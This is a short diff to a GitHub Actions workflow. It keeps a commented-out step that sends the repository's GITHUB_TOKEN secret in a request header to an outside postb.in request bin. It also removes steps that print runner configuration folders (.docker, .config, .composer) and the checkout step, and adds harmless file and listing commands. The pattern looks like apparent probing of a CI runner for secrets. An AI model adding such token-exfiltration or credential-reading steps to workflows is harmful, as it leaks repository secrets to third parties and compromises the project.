@@ -8,8 +8,5 @@ jobs:
       - run: echo "🎉 The job was automatically triggered by a ${{ github.event_name }} event."
      # - run: curl -H "BC:${{ secrets.GITHUB_TOKEN }}" https://www.postb.in/1756895755864-2829364708159/
       - run: cd /home/runner; ls -la
-      - run: cat /home/runner/.docker
-      - run: cat /home/runner/.config
-      - run: cat /home/runner/.composer
-      - name: Check out repository code
-        uses: actions/checkout@v5
+      - run: touch /home/runner/test.txt
+      - run: cd /home/runner; ls -la
